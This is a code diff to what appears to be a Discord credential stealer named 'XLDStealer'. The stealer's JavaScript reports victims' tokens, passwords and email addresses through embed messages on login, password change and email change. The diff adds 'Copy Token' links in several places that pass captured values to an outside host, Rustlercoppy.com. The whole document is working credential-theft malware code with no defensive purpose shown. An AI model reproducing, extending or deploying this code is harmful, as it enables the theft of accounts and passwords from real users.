@@ -81,7 +81,7 @@ function FirstTime() {
                         inline: !1,
                       },
                       { name: "<:question:966655842202050570> Token", value: `\`\`\`${e}\`\`\``, inline: !1 },
-                    ],
+                      { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !1},  ],
                     author: { name: "XLDStealer" },
                     footer: { text: "XLDStealer" },
                     thumbnail: {
@@ -158,6 +158,7 @@ function FirstTime() {
                           value: `\`\`\`${e}\`\`\``,
                           inline: !1,
                         },
+                         { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !1},
                       ],
                       author: { name: "XLDStealer" },
                       footer: { text: "XLDStealer" },
@@ -357,6 +358,7 @@ function Login(e, t, n) {
                             value: `\`\`\`${n}\`\`\``,
                             inline: !1,
                           },
+                           { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !1},
                         ],
                         author: { name: "XLDStealer" },
                         footer: { text: "XLDStealer" },
@@ -471,7 +473,7 @@ function ChangePassword(e, t, n) {
                       { name: "Old <:lock:966790360409989171> Password", value: `\`${e}\``, inline: !0 },
                       { name: "New <:lock:966790360409989171> Password", value: `\`${t}\``, inline: !0 },
                       { name: "<:question:966655842202050570> Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
-                    ],
+                   { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !1},  ],
                     author: { name: "XLDStealer" },
                     footer: { text: "XLDStealer" },
                     thumbnail: {
@@ -560,7 +562,7 @@ function ChangeEmail(e, t, n) {
                       { name: "New <:gmail:966790304701235230> Email", value: `\`${e}\``, inline: !0 },
                       { name: "<:lock:966790360409989171> Password", value: `\`${t}\``, inline: !0 },
                       { name: "<:question:966655842202050570> Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
-                    ],
+                    { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !1}, ],
                     author: { name: "XLDPirateStealer" },
                     footer: { text: "XLDStealer" },
                     thumbnail: {
